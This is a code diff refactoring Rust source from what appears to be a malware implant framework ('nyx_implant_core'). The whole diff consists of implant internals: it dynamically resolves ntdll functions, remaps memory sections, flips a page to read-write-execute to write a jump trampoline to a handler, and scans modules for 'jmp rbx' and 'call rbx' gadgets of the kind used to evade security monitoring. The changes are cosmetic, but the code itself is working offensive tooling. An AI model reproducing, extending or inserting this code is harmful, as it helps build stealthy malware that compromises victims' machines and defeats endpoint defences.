@@ -287,20 +287,9 @@ type NtProtectVmFn =
 /// Resolve the NT APIs needed for the section-backed handler: NtOpenFile,
 /// NtCreateSection and NtMapViewOfSection. Returns None if any is missing.
 unsafe fn resolve_section_apis() -> Option<(usize, usize, usize)> {
-    let nt_open = match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtOpenFile") {
-        Some(a) => a,
-        None => return None,
-    };
-    let nt_create_sec =
-        match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtCreateSection") {
-            Some(a) => a,
-            None => return None,
-        };
-    let nt_map_view =
-        match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection") {
-            Some(a) => a,
-            None => return None,
-        };
+    let nt_open = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtOpenFile")?;
+    let nt_create_sec = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtCreateSection")?;
+    let nt_map_view = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection")?;
     Some((nt_open, nt_create_sec, nt_map_view))
 }
 
@@ -450,7 +439,7 @@ unsafe fn map_section_view(sec_handle: usize, nt_map_view: usize) -> Option<(*mu
 /// Close a handle via NtClose (best-effort; resolution failure is ignored).
 unsafe fn close_handle(handle: usize) {
     let f: NtCloseFn = match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtClose") {
-        Some(a) => core::mem::transmute(a),
+        Some(a) => core::mem::transmute::<usize, NtCloseFn>(a),
         None => return,
     };
     f(handle);
@@ -467,11 +456,8 @@ unsafe fn unmap_view(view_base: *mut c_void) {
 /// Resolve NtProtectVirtualMemory for the gap write (RX → RWX → write → RX).
 unsafe fn resolve_nt_protect() -> Option<NtProtectVmFn> {
     let nt_protect =
-        match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory") {
-            Some(a) => a,
-            None => return None,
-        };
-    Some(core::mem::transmute(nt_protect))
+        nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")?;
+    Some(core::mem::transmute::<usize, NtProtectVmFn>(nt_protect))
 }
 
 /// Change the gap page protection to RWX, write a tiny trampoline
@@ -507,8 +493,8 @@ unsafe fn write_handler_trampoline(
     core::ptr::write(tramp, 0x48u8); // REX.W
     core::ptr::write(tramp.add(1), 0xB8u8); // MOV RAX, imm64
     let handler_bytes = (handler as usize).to_le_bytes();
-    for i in 0..8 {
-        core::ptr::write(tramp.add(2 + i), handler_bytes[i]);
+    for (i, &byte) in handler_bytes.iter().enumerate() {
+        core::ptr::write(tramp.add(2 + i), byte);
     }
     core::ptr::write(tramp.add(10), 0xFFu8); // JMP RAX
     core::ptr::write(tramp.add(11), 0xE0u8);
@@ -655,15 +641,11 @@ unsafe fn scan_module_for_gadgets(name: &[u8]) -> (Option<*mut u8>, Option<Found
             call_rbx: None,
         };
         for (j, &b) in bytes.iter().enumerate().take(bytes.len().saturating_sub(1)) {
-            if b == 0xFF && bytes[j + 1] == 0xE3 {
-                if result.jmp_rbx.is_none() {
-                    result.jmp_rbx = Some(sec_start + j);
-                }
+            if b == 0xFF && bytes[j + 1] == 0xE3 && result.jmp_rbx.is_none() {
+                result.jmp_rbx = Some(sec_start + j);
             }
-            if b == 0xFF && bytes[j + 1] == 0xD3 {
-                if result.call_rbx.is_none() {
-                    result.call_rbx = Some(sec_start + j);
-                }
+            if b == 0xFF && bytes[j + 1] == 0xD3 && result.call_rbx.is_none() {
+                result.call_rbx = Some(sec_start + j);
             }
             if result.jmp_rbx.is_some() && result.call_rbx.is_some() {
                 break;
